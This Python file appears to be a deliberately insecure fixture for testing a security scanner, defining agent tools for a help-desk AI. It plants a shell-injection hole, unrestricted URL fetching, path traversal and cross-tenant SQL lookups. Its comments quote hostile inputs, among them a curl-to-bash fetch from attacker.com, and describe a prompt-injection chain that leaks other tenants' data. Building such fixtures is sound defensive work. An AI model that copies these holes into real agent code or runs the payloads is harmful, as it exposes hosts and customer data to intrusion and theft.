"""
Agent tool definitions.

SECURITY FIXTURE — This file contains deliberately insecure tool implementations
for use as a Trent scan validation fixture. Do NOT use this code in production.

Planted findings (application tier):
  VULN-APP-001: run_shell — RCE via shell=True with user-supplied command string
  VULN-APP-002: fetch_url — SSRF via user-supplied URL with no allowlist or redirect cap
  VULN-APP-003: read_file — path traversal via user-supplied path with no sandbox

The HelpDeskAI domain tools below wire the support agent into the tenant data layer
(src/data/*). They carry the multi-tenancy + database findings transitively — this is
what makes the agent able to reach tenant data, and what makes CHAIN-1 (chat
prompt-injection -> un-tenant-scoped lookup -> cross-tenant PII) concrete.
"""

import subprocess
import urllib.request
from langchain_core.tools import tool

from src.data.rds_client import RDSClient
from src.data.s3_client import S3Client
from src.data.dynamodb_client import DynamoDBClient


@tool
def read_file(path: str) -> str:
    """Read the contents of a file at the given path and return them as a string.

    Args:
        path: Filesystem path to read. Relative or absolute.
    """
    # VULN-APP-003: No path validation. The caller can supply "../../../etc/passwd"
    # or any other path on the host filesystem. There is no chroot, no allow-list,
    # and no check that the path stays within the intended working directory.
    with open(path, "r") as f:
        return f.read()


@tool
def run_shell(command: str) -> str:
    """Run a shell command and return its combined stdout+stderr output.

    Args:
        command: The shell command to execute.
    """
    # VULN-APP-001: shell=True passes the command string to /bin/sh verbatim.
    # A caller supplying "ls; cat /etc/shadow" or "$(curl attacker.com/payload | bash)"
    # gets arbitrary code execution on the host.
    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        timeout=30,
    )
    return result.stdout + result.stderr


@tool
def fetch_url(url: str) -> str:
    """Fetch the contents of a URL and return the response body as a string.

    Args:
        url: The URL to fetch. HTTP and HTTPS are supported.
    """
    # VULN-APP-002: No URL allowlist, no redirect cap, no IP range blocking.
    # An attacker can supply "http://169.254.169.254/latest/meta-data/" to reach
    # EC2 instance metadata, or "http://internal-service/" to reach services on
    # the agent's internal network (SSRF).
    with urllib.request.urlopen(url, timeout=10) as response:
        return response.read().decode("utf-8", errors="replace")


# ── HelpDeskAI domain tools (operate on tenant data) ─────────────────────────

@tool
def lookup_order(order_id: str, tenant_id: str) -> dict:
    """Look up a customer order by its ID for the current tenant.

    Args:
        order_id: The order identifier to look up.
        tenant_id: The current tenant context.
    """
    # SECURITY FIXTURE: VULN-MT-001 + VULN-DATA-001 (transitive) — order_id flows
    # straight from the agent (and thus from end-customer chat input) into
    # RDSClient.lookup_order, which builds raw f-string SQL with no tenant scoping.
    # A prompt-injected agent can read ANY tenant's order (CHAIN-1). tenant_id is
    # accepted but ignored by the underlying query.
    return RDSClient().lookup_order(order_id)


@tool
def issue_refund(order_id: str, amount: float, tenant_id: str) -> bool:
    """Issue a refund of `amount` against `order_id` for the current tenant.

    Args:
        order_id: The order to refund.
        amount: Refund amount.
        tenant_id: The current tenant context.
    """
    # SECURITY FIXTURE: VULN-MT-001 + VULN-DATA-001 (transitive) — cross-tenant
    # write IDOR + SQLi reachable from the agent.
    return RDSClient().issue_refund(order_id, amount)


@tool
def search_kb(query_prefix: str, tenant_id: str) -> list:
    """Search the tenant knowledge base for documents matching a prefix.

    Args:
        query_prefix: Document key prefix to search.
        tenant_id: The current tenant context.
    """
    # SECURITY FIXTURE: VULN-MT-003 (transitive) — query_prefix flows into
    # S3Client.search_kb, which does not enforce a per-tenant prefix; "../other/"
    # reaches another tenant's KB.
    return S3Client().search_kb(tenant_id, query_prefix)


@tool
def create_ticket(subject: str, body: str, customer_email: str, tenant_id: str) -> dict:
    """Create a support ticket for the current tenant.

    Args:
        subject: Ticket subject.
        body: Ticket body.
        customer_email: Customer's email.
        tenant_id: The current tenant context.
    """
    # Correctly tenant-scoped write (CTRL-DATA-001 lives in DynamoDBClient.create_ticket).
    return DynamoDBClient().create_ticket(tenant_id, subject, body, customer_email)


# Tool registry — the orchestrator binds the ops tools plus the domain tools.
# The generic ops tools (read_file/run_shell/fetch_url) are internal/debug tools that
# should NOT be exposed to a customer-facing agent — their presence is itself a finding.
ALL_TOOLS = [
    read_file,
    run_shell,
    fetch_url,
    lookup_order,
    issue_refund,
    search_kb,
    create_ticket,
]

# Subset exposed to the sub-agent — intentionally excludes run_shell and the
# refund/ticket write tools to limit blast radius, but read tools remain (still risky).
SUB_AGENT_TOOLS = [read_file, fetch_url, lookup_order, search_kb]
